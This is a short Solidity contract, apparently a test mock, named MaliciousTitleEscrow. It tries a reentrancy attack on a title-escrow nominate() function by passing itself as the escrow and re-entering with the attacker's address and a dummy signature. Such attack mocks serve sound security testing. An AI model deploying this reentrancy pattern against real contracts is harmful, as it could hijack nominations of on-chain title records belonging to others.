// SPDX-License-Identifier: GPL-3.0-or-later
// Author: Credore (Trustless Private Limited)
pragma solidity >=0.8.0;

interface INominateContract {
    function nominate(
        address _nominee,
        bytes calldata _remark,
        address _titleEscrow,
        bytes calldata _data,
        bytes calldata _signature,
        uint256 _nonce
    ) external;
}

contract MaliciousTitleEscrow {
    address public target;
    address public attacker;

    constructor(address _target) {
        target = _target;
    }

    function attack(address _nominee, bytes calldata _remark, bytes calldata _data, bytes calldata _signature, uint256 _nonce) external {
        attacker = msg.sender;
        // Now call target.nominate, passing this contract as the _titleEscrow
        INominateContract(target).nominate(_nominee, _remark, address(this), _data, _signature, _nonce);
    }

    // This function gets called via .call(...) from nominate()
    function nominate(bytes calldata, bytes calldata) external returns (bool) {
        // Try to reenter during .call()
        bytes memory emptyRemark = "";
        bytes memory emptyData = "";
        bytes memory dummySig = hex"00";
        try INominateContract(target).nominate(attacker, emptyRemark, address(this), emptyData, dummySig, 999) {
            return true;
        } catch {
            return false;
        }
    }
}
